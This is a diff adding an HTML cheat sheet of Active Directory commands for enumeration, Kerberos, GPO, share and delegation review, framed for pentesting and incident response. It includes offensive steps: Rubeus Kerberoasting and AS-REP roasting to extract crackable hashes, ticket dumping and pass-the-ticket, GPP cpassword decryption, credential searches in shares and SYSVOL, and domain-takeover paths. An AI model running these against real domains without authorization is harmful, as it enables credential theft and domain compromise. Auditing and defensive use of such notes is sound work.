@@ -1,0 +1,841 @@
+<h1>Active Directory</h1>
+
+<p class="section-intro">
+    Practical AD notes - enumeration, privilege paths, misconfig checks, attack surfaces,
+    and the commands you actually need when dealing with Windows domains.
+</p>
+
+<!-- SECTION 1: Domain Enumeration -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('ad-enum')">
+        1. Domain Enumeration
+    </div>
+    <div class="tool-details" id="ad-enum">
+
+<pre>
+# --- Baseline: Who am I in the domain? ---
+whoami /user
+whoami /groups
+whoami /priv
+    # Tells you:
+    # - Your SID
+    # - Group memberships
+    # - Effective privileges (SeImpersonate, SeBackup, etc.)
+
+# --- Domain info (AD PowerShell module) ---
+Get-ADDomain
+Get-ADForest
+(Get-ADDomainController -Discover).Hostname
+
+# --- Enumerate domain users ---
+Get-ADUser -Filter * -Properties * |
+    Select Name, SamAccountName, Enabled, PasswordLastSet, LastLogonDate
+
+# --- Enumerate domain groups ---
+Get-ADGroup -Filter *
+Get-ADGroupMember "Domain Admins"
+Get-ADGroupMember "Enterprise Admins"
+
+# --- Built-in commands (no modules needed) ---
+net user /domain
+net group /domain
+net group "Domain Admins" /domain
+nltest /dclist:<domain>
+nltest /dsgetsite
+
+# --- List all domain controllers ---
+Get-ADDomainController -Filter *
+
+# --- Find high-value users (Kerberos service accounts) ---
+Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName |
+    Select SamAccountName, ServicePrincipalName
+
+# --- Find machines you can directly access ---
+Get-ADComputer -Filter * -Properties OperatingSystem |
+    Select Name, OperatingSystem
+
+# --- List all OU structure (useful for hunting GPOs) ---
+Get-ADOrganizationalUnit -Filter * | Select Name, DistinguishedName
+</pre>
+
+<p><b>Why this matters:</b></p>
+<ul>
+    <li>You need to know *who you are* in AD before you know what you can escalate to.</li>
+    <li>Discovering DCs, users, and groups defines the attack/defense map immediately.</li>
+    <li>Service accounts often grant hidden rights through SPNs (Kerberos attack surface).</li>
+    <li>OU structure reveals GPO relationships and misconfigurations.</li>
+</ul>
+
+<p>
+This is the “entry point” for any AD investigation - from pentesting to IR.
+It tells you what's running the domain and how identities are structured.
+</p>
+
+    </div>
+</div>
+
+<!-- SECTION 2: User & Group Recon -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('ad-users')">
+        2. Users & Groups
+    </div>
+    <div class="tool-details" id="ad-users">
+
+<pre>
+# --- Basic AD user + group enumeration (works anywhere) ---
+net user /domain
+net user <username> /domain
+net group /domain
+net group "Domain Admins" /domain
+net group "Enterprise Admins" /domain
+
+# --- PowerShell AD Recon (much more powerful) ---
+# List all users with key fields:
+Get-ADUser -Filter * -Properties * |
+    Select SamAccountName, Enabled, PasswordLastSet, LastLogonDate, whenCreated
+
+# List privileged groups:
+$priv = "Domain Admins","Enterprise Admins","Administrators","Backup Operators"
+foreach ($g in $priv) { Get-ADGroupMember $g }
+
+# List all nested group relationships:
+Get-ADGroup -Filter * -Properties Members |
+    Select Name, Members
+
+# Identify stale or unused accounts (attack surface):
+Get-ADUser -Filter * -Properties LastLogonDate |
+    Where-Object { $_.LastLogonDate -lt (Get-Date).AddDays(-90) }
+
+# Find accounts with "Password Never Expires" (high-risk):
+Get-ADUser -Filter * -Properties PasswordNeverExpires |
+    Where-Object { $_.PasswordNeverExpires -eq $true }
+
+# Find users with SPNs (Kerberoast targets):
+Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName |
+    Select SamAccountName, ServicePrincipalName
+
+# Find users with delegation privileges (dangerous):
+Get-ADUser -Filter * -Properties msDS-AllowedToDelegateTo |
+    Where-Object { $_.'msDS-AllowedToDelegateTo' }
+
+# --- Group Recon: membership, nesting, ACLs ---
+# Show who can modify a group (priv escalation path)
+Get-ADPermission "Domain Admins" |
+    Where-Object { $_.ExtendedRights -contains "Write Members" }
+
+# Find who can reset passwords for others:
+Find-AdmPwdExtendedRights -Identity "OU=Servers,DC=domain,DC=local"
+
+# List group owners (often overlooked):
+Get-ADGroup -Filter * -Properties ManagedBy |
+    Select Name, ManagedBy
+</pre>
+
+<p><b>Why this matters:</b></p>
+<ul>
+    <li>Privilege in AD comes mostly from *group memberships* and *ACL rights*, not just titles.</li>
+    <li>Stale accounts are easy footholds for attackers.</li>
+    <li>SPN accounts expose Kerberoasting attack paths.</li>
+    <li>Delegation attributes reveal “who can impersonate who.”</li>
+    <li>Membership nesting hides privilege paths visible only through enumeration.</li>
+</ul>
+
+<p>
+This is the identity layer of AD.  
+If you understand users + groups, you understand 80% of the domain's security posture.
+</p>
+
+    </div>
+</div>
+
+
+<!-- SECTION 3: Computers & SPN Enumeration -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('ad-spn')">
+        3. Computers & SPN Enumeration
+    </div>
+    <div class="tool-details" id="ad-spn">
+
+<pre>
+# --- List ALL SPNs in the domain (classic recon) ---
+setspn -Q */*
+    # Shows service accounts, services, MSSQL instances, IIS apps, etc.
+    # Foundation for detecting kerberoastable accounts.
+
+# --- List SPNs for a specific user ---
+setspn -L <username>
+
+# --- PowerShell: enumerate all SPN accounts (better visibility) ---
+Get-ADUser -Filter { ServicePrincipalName -like "*" } -Properties ServicePrincipalName |
+    Select SamAccountName, ServicePrincipalName
+
+# --- Find kerberoastable accounts (high-risk) ---
+Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName,PasswordLastSet |
+    Where-Object { $_.PasswordLastSet -lt (Get-Date).AddDays(-30) }
+
+# --- Computers enumeration (general asset mapping) ---
+Get-ADComputer -Filter * -Properties OperatingSystem,LastLogonDate |
+    Select Name,OperatingSystem,LastLogonDate
+
+# --- Find machines running specific roles ---
+Get-ADComputer -LDAPFilter "(operatingSystem=*Server*)" |
+    Select Name,OperatingSystem
+
+# --- Identify unmanaged or stale hosts (lateral movement entry points) ---
+Get-ADComputer -Filter * -Properties LastLogonDate |
+    Where-Object { $_.LastLogonDate -lt (Get-Date).AddDays(-60) }
+
+# --- Resolve machine accounts to SPNs (service → machine mapping) ---
+Get-ADComputer -Filter * -Properties ServicePrincipalName |
+    Where-Object { $_.ServicePrincipalName } |
+    Select Name,ServicePrincipalName
+
+# --- Enumerate all unconstrained delegation accounts ---
+Get-ADComputer -Filter {TrustedForDelegation -eq $true} |
+    Select Name,TrustedForDelegation
+
+# --- Constrained delegation (targeted privilege chains) ---
+Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo |
+    Select SamAccountName,msDS-AllowedToDelegateTo
+
+</pre>
+
+<p><b>Why this matters:</b></p>
+<ul>
+    <li>SPNs reveal service accounts - the most abused accounts in AD.</li>
+    <li>Kerberoast paths come directly from SPNs.</li>
+    <li>Outdated machine accounts are perfect targets for credential replay.</li>
+    <li>Delegation attributes expose who can impersonate who.</li>
+    <li>Computer enumeration defines the attack surface and pivot points.</li>
+</ul>
+
+<p>
+SPN enumeration is one of the most valuable reconnaissance steps in all of Active Directory -  
+it reveals hidden privilege relationships, misconfigs, and attack paths instantly.
+</p>
+
+    </div>
+</div>
+
+
+<!-- SECTION 4: Shares & File Access -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('ad-shares')">
+        4. Shares & File Access
+    </div>
+    <div class="tool-details" id="ad-shares">
+
+<pre>
+# --- Classic SMB share enumeration (internal discovery) ---
+net view \\domaincontroller
+net view \\<hostname>
+
+# List all shares on every DC in the domain
+foreach ($dc in (Get-ADDomainController -Filter *).Hostname) {
+    net view \\$dc
+}
+
+# --- PowerShell: enumerate accessible shares on network hosts ---
+Get-SmbShare -CimSession <hostname> |
+    Select Name,Path,Description
+
+# --- Find shares with Everyone/Authenticated Users permissions ---
+Get-SmbShare | Get-SmbShareAccess |
+    Where-Object { $_.AccountName -match "Everyone|Authenticated Users" }
+
+# --- Enumerate accessible shares across domain (PowerView/AD) ---
+Find-DomainShare
+Find-DomainShare -CheckAccess
+
+# --- Map where you have write privileges (VERY important) ---
+Find-InterestingDomainAcl -ResolveGUIDs |
+    Where-Object { $_.IdentityReference -match $env:USERNAME }
+
+# --- Recursively scan SMB paths for sensitive files ---
+# (configs, scripts, creds, backups)
+gci "\\server\share" -Recurse -Include *.ps1,*.kdbx,*.config,*.xml,*.txt
+
+# --- Identify password patterns in shares ---
+Select-String -Path "\\server\share\*" -Pattern "password|passwd|pwd|creds|key" -SimpleMatch
+
+# --- File ACL abuse: who can write where? ---
+(Get-Acl "\\server\share\folder").Access |
+    Where-Object { $_.FileSystemRights -match "Write|Modify" }
+
+# --- Find open writable shares (RIDICULOUSLY common misconfig) ---
+Invoke-ShareFinder -CheckAccess
+
+# --- Check SYSVOL / NETLOGON (GPO scripts often leak creds) ---
+gci "\\<domain>\SYSVOL\<domain>\scripts"
+gci "\\<domain>\NETLOGON"
+
+</pre>
+
+<p><b>Why this matters:</b></p>
+<ul>
+    <li>File shares usually contain sensitive data: configs, passwords, scripts, backups.</li>
+    <li>Writable shares → easy privilege escalation and lateral movement staging.</li>
+    <li>SYSVOL/NETLOGON often leak plaintext credentials in logon scripts.</li>
+    <li>ACL misconfigurations can expose unintended write or read access.</li>
+    <li>Attackers abuse open shares for staging tools, payloads, and footholds.</li>
+</ul>
+
+<p>
+Every serious AD compromise involves share abuse.  
+If you know how to enumerate and inspect shares properly, you instantly see half the attack surface others miss.
+</p>
+
+    </div>
+</div>
+
+
+<!-- SECTION 5: GPO Recon -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('ad-gpo')">
+        5. Group Policy Objects (GPO)
+    </div>
+    <div class="tool-details" id="ad-gpo">
+
+<pre>
+# --- List all GPOs in the domain ---
+Get-GPO -All | Select DisplayName,Id,Owner,CreationTime,ModificationTime
+
+# --- Find GPOs linked to specific OUs (critical for attack pathing) ---
+Get-GPLink -Domain "<domain>" -Name "<OU>"
+
+# --- Find GPOs applied to your current user/machine ---
+gpresult /r
+gpresult /h gp.html
+
+# --- Enumerate GPO permissions (look for writable GPOs - HUGE finding) ---
+Get-GPPermission -All -TargetName "Authenticated Users" -TargetType User
+
+# Check who can modify each GPO (Privilege escalation goldmine)
+Get-GPO -All | ForEach-Object {
+    Get-GPPermission -Guid $_.Id -All |
+        Where-Object { $_.Permission -match "GpoEdit|GpoCustom" }
+}
+
+# --- Enumerate SYSVOL-based GPO scripts (sometimes contains passwords) ---
+gci "\\<domain>\SYSVOL\<domain>\Policies" -Recurse -Include *.bat,*.ps1,*.vbs
+
+# --- Search for embedded credentials in GPP XML (old but still found IRL) ---
+Select-String -Path "\\<domain>\SYSVOL\<domain>\Policies\*\Machine\Preferences\**\*.xml" `
+    -Pattern "cpassword|password|pwd|user" -SimpleMatch
+
+# --- Decrypt legacy GPP cpassword (Microsoft left the AES key public) ---
+# (Only works when GPP still deployed)
+Import-Module .\gpp-decrypt.ps1
+gpp-decrypt -Cpassword "<value>"
+
+# --- Detect dangerous GPO settings: startup scripts, scheduled tasks ---
+Get-GPOReport -All -ReportType Xml | Select-String "Scripts|ScheduledTasks|Runs|RunOnce"
+
+# --- Find GPOs pushing local admin accounts (VERY common misconfig) ---
+Select-String -Path "\\<domain>\SYSVOL\<domain>\Policies\*" `
+    -Pattern "Administrators|LocalAccount" -SimpleMatch
+
+# --- Look for GPO-based software installs (MSI abuse potential) ---
+Get-GPOReport -All -ReportType Xml | Select-String "SoftwareInstallation"
+
+# --- Audit user rights assignments (logon as service / batch / remote desktop) ---
+secedit /export /cfg sec.cfg
+Select-String sec.cfg -Pattern "SeDeny|SeRemote|SeService|SeBatch"
+</pre>
+
+<p><b>Why this matters:</b></p>
+<ul>
+    <li>Writable GPOs = domain-wide compromise (instant RCE on all linked machines).</li>
+    <li>SYSVOL often contains readable logon scripts with creds or secrets.</li>
+    <li>GPP cpassword still appears in many real networks.</li>
+    <li>Startup scripts / scheduled tasks in GPO can hide attacker persistence.</li>
+    <li>GPO permissions often reveal misconfigured privilege escalation paths.</li>
+</ul>
+
+<p>
+GPOs are the backbone of AD control.  
+Misconfig one - and the entire domain bends.  
+This section gives you the exact recon every pro checks first.
+</p>
+
+    </div>
+</div>
+
+
+<!-- SECTION 6: Kerberos Attack Surface -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('ad-kerb')">
+        6. Kerberos Attack Surface
+    </div>
+    <div class="tool-details" id="ad-kerb">
+
+<pre>
+# --- Current Kerberos tickets on this machine ---
+klist
+klist purge                  # clear all tickets
+klist tgt                    # show TGT specifically
+
+# --- Enumerate Kerberoastable accounts (PowerView / AD module) ---
+Get-ADUser -Filter { ServicePrincipalName -ne $null } `
+    -Properties ServicePrincipalName |
+    Select SamAccountName,ServicePrincipalName
+
+# PowerView alternative:
+Get-NetUser | Where-Object { $_.serviceprincipalname }
+
+# --- Request service tickets for roasting (no login required, just domain access) ---
+Invoke-Kerberoast
+# or manually:
+Get-ADUser -Filter * -Properties ServicePrincipalName |
+    Where { $_.ServicePrincipalName } |
+    ForEach-Object {
+        Write-Host "[*] Requesting ticket for $($_.SamAccountName)"
+        Rubeus.exe kerberoast /user:$_
+    }
+
+# --- Extract Kerberoast hashes directly (for cracking) ---
+Rubeus.exe kerberoast /nowrap
+
+# --- AS-REP Roasting targets (users with "Do not require Kerberos preauthentication") ---
+Get-ADUser -Filter * -Properties DoesNotRequirePreAuth |
+    Where-Object { $_.DoesNotRequirePreAuth -eq $true } |
+    Select SamAccountName
+
+# Roast them:
+Rubeus.exe asreproast /format:hashcat
+
+# --- Delegation Recon (HUGE attack surface) ---
+
+# Unconstrained delegation machines
+Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties *
+
+# Constrained delegation
+Get-ADComputer -Filter * -Properties msds-allowedtodelegateto |
+    Where { $_."msds-allowedtodelegateto" }
+
+# Identify accounts allowed to pretend to others (s4u abuse)
+Get-NetUser -TrustedToAuth # PowerView
+
+# Resource-based constrained delegation (RBCD)
+Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
+    Where { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" -ne $null }
+
+# --- Ticket export / import (golden/silver ticket workflows) ---
+# dump current tickets
+Rubeus.exe dump
+
+# pass-the-ticket
+Rubeus.exe ptt /ticket:base64ticket.kirbi
+
+# --- Detect high-value service accounts (KRBTGT, DA SPNs, SQL) ---
+Get-ADUser -Filter * -Properties ServicePrincipalName |
+    Where { $_.ServicePrincipalName -match "MSSQLSvc|HTTP|LDAP" }
+
+# --- Detect weak encryption in domain (DES/RC4 enabled) ---
+Get-ADUser -Filter * -Properties "SupportedEncryptionTypes" |
+    Select SamAccountName,SupportedEncryptionTypes
+</pre>
+
+<p><b>Why this matters:</b></p>
+<ul>
+    <li>Kerberoasting = most common domain compromise entry point.</li>
+    <li>AS-REP roasting exposes accounts with misconfigured preauth → cracked offline.</li>
+    <li>Unconstrained/Constrained Delegation leads directly to domain domination.</li>
+    <li>RBCD is abused constantly in modern attacks (no exploit needed, just misconfig).</li>
+    <li>Weak encryption settings allow ticket forgeries and downgrade attacks.</li>
+</ul>
+
+<p>
+Kerberos is where almost every modern AD breach starts.  
+This section gives you the exact recon path attackers use - and defenders need to watch for.
+</p>
+
+    </div>
+</div>
+
+
+<!-- SECTION 7: LDAP & Domain Trusts -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('ad-ldap')">
+        7. LDAP & Domain Trusts
+    </div>
+    <div class="tool-details" id="ad-ldap">
+
+<pre>
+# --- Domain Trust Enumeration (Quick Wins) ---
+nltest /domain_trusts
+nltest /trusted_domains
+nltest /dclist:domain.local
+nltest /parentdomain
+nltest /forest
+
+# Show trust details (SID filtering, type, direction)
+Get-ADTrust -Filter * |
+    Select Name,Direction,TrustType,TrustAttributes
+
+# PowerView equivalent
+Get-NetDomainTrust
+
+# --- Forest Enumeration ---
+Get-ADForest
+Get-ADForest | Select-Object Domains,RootDomain,GlobalCatalogs
+
+# Map child/parent domains
+Get-ADForest | Format-List *
+
+# --- LDAP Server Metadata (DC fingerprinting) ---
+nltest /dsgetdc:domain.local /force
+nltest /dsgetdc:domain.local /gc
+
+# Ping LDAP directory directly
+ldapsearch -x -H ldap://domaincontroller -b "dc=domain,dc=local"
+
+# --- LDAP Queries for Recon ---
+# List all OUs
+Get-ADOrganizationalUnit -Filter * | Select Name,DistinguishedName
+
+# Enumerate computers
+Get-ADComputer -Filter * -Properties OperatingSystem |
+    Select Name,OperatingSystem
+
+# Identify domain controllers
+Get-ADDomainController -Filter *
+
+# Query sensitive group memberships using LDAP
+Get-ADGroupMember "Domain Admins"
+Get-ADGroupMember "Enterprise Admins"
+
+# Raw LDAP query via PowerShell (fast)
+[ADSI]"" |
+    Select ChildDomains,RootDomain,SchemaNamingContext
+
+# --- Detect External & Cross-Forest Trusts ---
+Get-ADTrust -Filter {TrustType -ne "Windows"} |
+    Select Name,TrustType,Direction
+
+# Check SID filtering (critical for hardened environments)
+Get-ADTrust -Filter * | Select Name,IsSIDFilteringEnabled
+
+# --- Kerberos realm trust mapping ---
+klist tgt
+# Identify if you're receiving tickets from multiple realms
+
+# --- Useful PowerView combos ---
+Get-NetDomainTrust | 
+    Select SourceName,TargetName,TrustDirection,TrustType
+
+# Detect orphaned/unused trusts
+Get-ADTrust -Filter * | Where { $_.IsTransitive -eq $false }
+</pre>
+
+<p><b>Why this matters:</b></p>
+<ul>
+    <li>Trusts define how compromise spreads across domains.</li>
+    <li>Cross-forest trusts often provide unexpected privilege escalation paths.</li>
+    <li>LDAP gives raw, unrestricted visibility - no GUI filters, no hiding.</li>
+    <li>SID Filtering off = attackers can forge SIDs and escalate across trusts.</li>
+    <li>Mapping the forest is the first step before targeting service accounts or delegation paths.</li>
+</ul>
+
+<p>
+Knowing trusts + LDAP layout = knowing the real shape of the network.  
+This is how attackers navigate large enterprises - and how defenders catch them.
+</p>
+
+    </div>
+</div>
+
+
+<!-- SECTION 8: Privilege Escalation Paths -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('ad-privesc')">
+        8. Privilege Escalation Paths
+    </div>
+    <div class="tool-details" id="ad-privesc">
+
+<pre>
+# --- Collecting Data for BloodHound ---
+SharpHound.exe --CollectionMethod All --ZipFile
+Invoke-BloodHound -CollectionMethod All
+
+# Stealthier recon
+Invoke-BloodHound -CollectionMethod ACL,LocalAdmin,Sessions -Stealth
+
+# Linux alternative (impacket)
+bloodhound-python -d domain.local -u user -p pass -ns DC_IP -c All
+
+
+# --- Quick Checks Without BloodHound ---
+
+# 1. Find users with unconstrained delegation
+Get-ADComputer -Filter {TrustedForDelegation -eq $true} |
+    Select Name,TrustedForDelegation
+
+# 2. Find RBCD (Resource-Based Constrained Delegation) abuse paths
+Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
+    Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" -ne $null }
+
+# 3. Find machines where you have local admin
+Get-NetLocalGroupMember -ComputerName target | 
+    Where-Object { $_.MemberName -eq "YOURUSER" }
+
+# 4. Find GPOs you can modify (very common)
+Get-NetGPO | Get-ObjectACL | 
+    Where-Object { $_.ActiveDirectoryRights -match "Write|Modify" }
+
+# 5. Check if user can reset other users' passwords
+Invoke-ACLScanner | 
+    Where-Object { $_.AceType -match "ResetPassword" }
+
+# 6. Look for writable SPNs (Kerberoast prep)
+Get-ADUser -Filter * -Properties ServicePrincipalName |
+    Where { $_.ServicePrincipalName -ne $null }
+
+# 7. Check AdminSDHolder inheritance (priv shadowing)
+Get-ADObject -Identity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -Properties *
+
+
+# --- Common PrivEsc Paths You Should Always Check ----
+
+# Abusable AD ACL rights
+- WriteDACL
+- WriteOwner
+- GenericAll
+- GenericWrite
+- ResetPassword
+- ForceChangePassword
+- AddMember (to privileged groups)
+- CreateChild/DeleteChild
+
+# Kerberos-based privilege escalation
+- AS-REP Roasting (user without pre-auth)
+- Kerberoasting
+- Unconstrained Delegation
+- Constrained Delegation abuse (S4U2Self/S4U2Proxy)
+- Resource-Based Constrained Delegation (RBCD takeover)
+
+# Computer object abuse
+- Add your own computer to domain (MachineAccountQuota)
+- Take over stale or orphaned computer accounts
+
+# GPO-based attacks
+- Modify GPO and push startup scripts
+- Modify restricted groups to add yourself as admin
+
+# Session-based paths
+- Enumerate logged-in admins → lateral movement
+Get-NetSession
+Get-NetLoggedOn
+
+# LAPS misconfig
+- LAPS recovery
+- Cleartext/password in GPO backups
+
+
+# --- Fast BloodHound Queries to Validate Escalation ---
+
+# All paths to DA
+MATCH p=shortestPath(
+    (n {name:"DOMAIN.LOCAL\\youruser"})-[r*..]->(m {name:"DOMAIN.LOCAL\\Domain Admins"})
+) RETURN p
+
+# Find where you have write access
+MATCH (n)-[r:WriteProperty|GenericWrite|GenericAll]->(m) RETURN n,r,m
+
+# Find RBCD paths
+MATCH (c:Computer)-[:AllowedToActOnBehalfOfOtherIdentity]->(target) RETURN c,target
+</pre>
+
+<p><b>Why this matters:</b></p>
+<ul>
+    <li>AD privilege escalation is 95% ACL/permissions abuse, 5% exploits.</li>
+    <li>BloodHound gives the graph, but you need commands to validate the edges.</li>
+    <li>Delegation paths (especially RBCD) are the #1 real-world escalation vector today.</li>
+    <li>Misconfigured GPOs and password reset rights are everywhere in large orgs.</li>
+    <li>Escalation often comes from small misconfigurations, not “big” vulnerabilities.</li>
+</ul>
+
+<p>
+This section gives you the exact building blocks to detect and exploit misconfigurations the same way modern red teams and threat actors do.
+</p>
+
+    </div>
+</div>
+
+
+<!-- SECTION 9: Common AD Misconfigurations -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('ad-misconfig')">
+        9. Common Misconfigurations
+    </div>
+    <div class="tool-details" id="ad-misconfig">
+
+<pre>
+# --- 1. Domain Users Can Join Computers (MachineAccountQuota > 0) ---
+# Anyone can create up to 10 machine accounts → RBCD → DA takeover
+(Get-ADDomain).MachineAccountQuota
+
+# --- 2. Weak or Missing ACLs on High-Value Objects ---
+# WriteDACL, GenericWrite, GenericAll on:
+# - Domain Admins
+# - AdminSDHolder
+# - Domain Controllers OU
+# - GPOs
+# - Service Accounts
+Invoke-ACLScanner
+
+# --- 3. Unconstrained Delegation (HUGE risk) ---
+Get-ADComputer -Filter {TrustedForDelegation -eq $true}
+
+# --- 4. Misconfigured Constrained Delegation (S4U Abuse) ---
+Get-ADComputer -Filter * -Properties msDS-AllowedToDelegateTo |
+    Where-Object { $_."msDS-AllowedToDelegateTo" }
+
+# --- 5. Resource-Based Constrained Delegation (RBCD) Abuse Paths ---
+Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
+    Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" -ne $null }
+
+# --- 6. GPO Abuse (Write Access to GPO or OU) ---
+Get-NetGPO | Get-ObjectACL |
+    Where-Object { $_.ActiveDirectoryRights -match "Write|Modify" }
+
+# --- 7. Stale Admins / Overprivileged Groups ---
+net localgroup administrators /domain
+net group "Domain Admins" /domain
+
+# --- 8. Account Operators → Full Domain Takeover (rare but happens) ---
+# Account Operators can modify Domain Admin accounts in some configs
+net group "Account Operators" /domain
+
+# --- 9. Password Not Required / Weak Password Policies ---
+Get-ADUser -Filter 'PasswordNotRequired -eq $true' -Properties *
+
+# --- 10. AS-REP Roastable Users (no pre-auth) ---
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
+
+# --- 11. SPN Misconfiguration Allowing Kerberoasting ---
+Get-ADUser -Filter * -Properties ServicePrincipalName |
+    Where-Object {$_.ServicePrincipalName -ne $null}
+
+# --- 12. Creds in SYSVOL / GPO Backups (cpassword) ---
+# Hardcoded AES keys allow instant decryption
+findstr /s cpassword \\domain\sysvol\*.xml
+
+# --- 13. Passwords in Description / Comment Fields ---
+Get-ADUser -Filter * -Properties description |
+    Where {$_.Description -match "password|pass|pwd"}
+
+# --- 14. Old Computers / Stale Accounts (easy takeover) ---
+Search-ADAccount -AccountInactive -ComputersOnly -TimeSpan 90.00:00:00
+
+# --- 15. Disabled or Missing LAPS ---
+# Without LAPS: local admin reuse → instant lateral movement
+Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd
+
+# --- 16. Empty / Weak Security Boundary in OUs ---
+# OUs with “Authenticated Users: Create/Delete” → full takeover path
+(Get-ACL "AD:OU=Workstations,DC=domain,DC=local").Access
+
+
+# These misconfigs are red-team gold mines:
+# - Delegation misconfig (unconstrained / constrained / RBCD)
+# - Abusable ACLs on users/groups/computers/OUs
+# - Weak password policies
+# - Stale admin sessions (Kerberos replay, token theft)
+# - Overprivileged GPO rights
+# - Missing LAPS
+# - SPN exposure
+# - Passwords stored in comments or SYSVOL
+</pre>
+
+<p><b>Why this matters:</b></p>
+<ul>
+    <li>Most AD breaches happen because of misconfigurations, not exploits.</li>
+    <li>BloodHound paths almost always originate from these weaknesses.</li>
+    <li>RBCD + MachineAccountQuota is still the most abused misconfig in modern attacks.</li>
+    <li>GPO and ACL abuse gives attackers silent, persistent control.</li>
+</ul>
+
+<p>
+This section is the "Most Wanted List" of what real attackers look for in Active Directory - fix these, and you break 80% of attack chains.
+</p>
+
+    </div>
+</div>
+
+
+<!-- SECTION 10: Fast AD Triage Checklist -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('ad-checklist')">
+        10. Quick AD Triage Checklist
+    </div>
+    <div class="tool-details" id="ad-checklist">
+
+<pre>
+# --- 1. Who am I (Identity)? ---
+whoami /groups
+Get-ADUser $env:USERNAME -Properties memberof
+# → Priv groups, delegated rights, shadow admin paths
+
+# --- 2. Who can I become (Escalation paths)? ---
+# ACL rights on users, groups, computers
+Invoke-ACLScanner
+# BloodHound collection for privilege edges:
+SharpHound.exe --CollectionMethod ACL,ACLOnly
+
+# --- 3. What can I touch (Attack surface)? ---
+# Shares, GPOs, writable paths, SPNs
+net view /domain
+findstr /s cpassword \\domain\sysvol\*.xml
+setspn -Q */*
+
+# --- 4. Are there roastable accounts? ---
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
+Get-ADUser -Filter * -Properties ServicePrincipalName |
+    Where {$_.ServicePrincipalName}
+
+# --- 5. Is MachineAccountQuota dangerous? ---
+(Get-ADDomain).MachineAccountQuota
+# >0 = anyone can create machines → RBCD → DA takeover
+
+# --- 6. Delegation risks (high-value) ---
+Get-ADComputer -Filter {TrustedForDelegation -eq $true}
+Get-ADComputer -Filter * -Properties msDS-AllowedToDelegateTo |
+    Where { $_."msDS-AllowedToDelegateTo" }
+
+# --- 7. Domain Trusts & Forest Map ---
+nltest /domain_trusts
+Get-ADTrust -Filter *
+
+# --- 8. Stale or weak accounts? ---
+Search-ADAccount -AccountInactive -UsersOnly
+Get-ADUser -Filter 'PasswordNotRequired -eq $true'
+
+# --- 9. GPO Abuse Potential ---
+Get-GPO -All | Get-GPPermission -All |
+    Where-Object { $_.Permission -match "Write" }
+
+# --- 10. Quick win extraction ---
+# Items that give immediate leverage:
+# - AS-REP roastables
+# - Kerberoastables
+# - Writable GPOs
+# - Delegation exposure
+# - RBCD misconfigs
+# - Overprivileged groups
+</pre>
+
+<p><b>Why this matters:</b></p>
+<ul>
+    <li>This is exactly how red teams get from “low-priv user” → “Domain Admin” in 2-5 minutes.</li>
+    <li>DFIR teams use the same checklist to see how the attacker moved.</li>
+    <li>A small set of checks reveals 80% of AD weaknesses immediately.</li>
+</ul>
+
+<p>
+This is the “AD fast recon” every operator should memorize before touching anything else.
+</p>
+
+    </div>
+</div>
+
